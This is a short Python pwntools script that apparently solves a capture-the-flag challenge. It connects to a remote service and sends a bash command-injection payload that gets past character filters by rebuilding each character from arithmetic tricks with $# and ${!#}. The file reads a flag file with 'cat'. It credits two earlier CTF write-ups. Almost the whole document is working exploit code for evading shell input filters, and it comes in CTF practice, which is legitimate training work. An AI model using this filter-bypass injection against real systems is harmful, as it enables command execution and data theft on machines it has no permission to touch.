from pwn import *

host, port = '35.222.73.197', 42051
context.log_level = 'info'

# slightly different solution but same idea from:

# https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60
def generate_command(cmd: chr) -> chr:
    payload = '${!#}<<<{'
    for c in 'bash':
        payload += c_to_s(c)
    payload += ','
    for c in '-c':
        payload += c_to_s(c)
    payload += ','
    for c in cmd:
        payload += c_to_s(c)
    payload += '}'
    return payload

# https://medium.com/@philomath213/securinets-ctf-quals-2019-special-revenge-6c923d5b900b
def c_to_s(c: chr) -> chr:
    character_to_binary = bin(int(oct(ord(c)).replace("0o", ""))).replace("0b", "")
    binary_to_octal = f"$(($((1<<1))#{''.join(['1' if i == '1' else '$#' for i in character_to_binary])}))"
    spc = f"\\$\\'\\\\{binary_to_octal}\\'"
    return spc

if __name__ == '__main__':
    io = remote(host, port)

    # payload = generate_command('ls '.ljust(145, ' ')) # padding to reach 5000 characters
    payload = generate_command('cat 159df48875627e2f7f66dae584c5e3a5/flag.txt'.ljust(145, ' '))
    io.sendlineafter(b'>>', payload.encode())

    io.interactive()